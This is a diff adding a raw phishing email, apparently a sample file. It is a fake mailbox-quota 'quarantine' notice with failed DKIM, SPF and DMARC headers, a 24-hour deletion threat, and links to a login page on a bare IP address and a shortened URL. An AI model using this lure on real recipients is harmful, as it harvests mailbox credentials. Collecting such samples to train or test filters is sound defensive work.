@@ -1,0 +1,23 @@
+Delivered-To: client@gmail.com
+Received: from relay7.fastsend-mail.net (relay7.fastsend-mail.net [45.142.212.61]) by mx.google.com with ESMTP id p4si; Wed, 5 Nov 2026 01:44:30 -0800 (PST)
+Return-Path: <no-reply@fastsend-mail.net>
+Authentication-Results: mx.google.com;
+       dkim=fail (signature did not verify) header.i=@secure-mailbox-support.com header.s=s1 header.b=Xx1Yy2;
+       spf=softfail (google.com: domain of transitioning no-reply@fastsend-mail.net does not designate 45.142.212.61 as permitted sender) smtp.mailfrom=no-reply@fastsend-mail.net;
+       dmarc=fail (p=NONE sp=NONE dis=NONE) header.from=secure-mailbox-support.com
+From: Mail Administrator <admin@secure-mailbox-support.com>
+To: client@gmail.com
+Subject: Final notice: 3 undelivered messages are waiting in quarantine
+Date: Wed, 05 Nov 2026 01:44:02 -0800
+Message-ID: <q8812.20261105@secure-mailbox-support.com>
+MIME-Version: 1.0
+Content-Type: text/html; charset="utf-8"
+Content-Transfer-Encoding: 7bit
+
+<html><body>
+<p>Your mailbox has 3 undelivered messages held in quarantine because your storage quota has been exceeded.</p>
+<p>To release the messages, confirm your mailbox here: <a href="http://185.234.72.19/secure/login/index.php?user=client@gmail.com">Release messages</a></p>
+<p>Or use the mobile link: <a href="https://bit.ly/3xYzAbCq">https://bit.ly/3xYzAbCq</a></p>
+<p>Messages not released within 24 hours will be permanently deleted.</p>
+<p>Mail Administrator</p>
+</body></html>
